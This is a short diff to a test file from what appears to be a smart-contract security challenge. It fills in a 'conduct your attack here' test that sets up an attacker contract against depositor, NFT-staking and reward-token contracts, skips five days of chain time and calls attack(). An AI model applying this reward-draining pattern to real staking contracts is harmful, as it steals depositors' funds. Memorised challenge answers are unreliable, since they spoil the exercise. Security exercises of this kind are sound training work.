@@ -50,7 +50,11 @@ describe(NAME, function () {
 
 		// prettier-ignore
 		it("conduct your attack here", async function () {
-  
+			await attackerContract.setup(depositoorContract.address, NFTToStakeContract.address, rewardTokenContract.address);
+			// 50e18 = 5 days * 10e18 / uint256(1 days) = 5 * 10e18
+			// hence wait 5 days
+			await time.increase(60 * 60 * 24 * 5);
+			await attackerContract.attack();
       });
 
 		after(async function () {
